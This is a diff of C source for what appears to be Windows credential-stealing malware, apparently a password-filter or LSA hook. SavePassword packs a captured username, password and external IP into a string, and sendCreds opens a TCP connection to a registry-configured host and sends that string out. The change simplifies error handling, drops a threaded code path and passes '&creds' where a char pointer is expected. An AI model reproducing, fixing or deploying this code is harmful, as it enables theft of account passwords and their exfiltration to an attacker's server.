@@ -10,19 +10,16 @@ void sendCreds(char* creds)
 	DWORD port = getPtReg();
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return; } 
 
-	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { goto end; }
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { return; }
 
 	server.sin_addr.s_addr = inet_addr(ip);
 	server.sin_family = AF_INET;
 	server.sin_port = htons(port);
 
-	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { goto end; }
+	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { return; }
 
-	if (send(s, creds, strlen(creds), 0) < 0) { goto end; }
+	if (send(s, creds, strlen(creds), 0) < 0) { return; }
 
-end:
-	// free(ip);
-	// WSACleanup();
 	return;
 }
 
@@ -39,8 +36,5 @@ void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	snprintf(creds, sizeof(creds), "%s\x11%s\x12%s\x13", user, pass, eip);
 	free(eip);
 
-#ifdef LSA
-	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
-#else
-	sendCreds(creds);
+	sendCreds(&creds);
 }
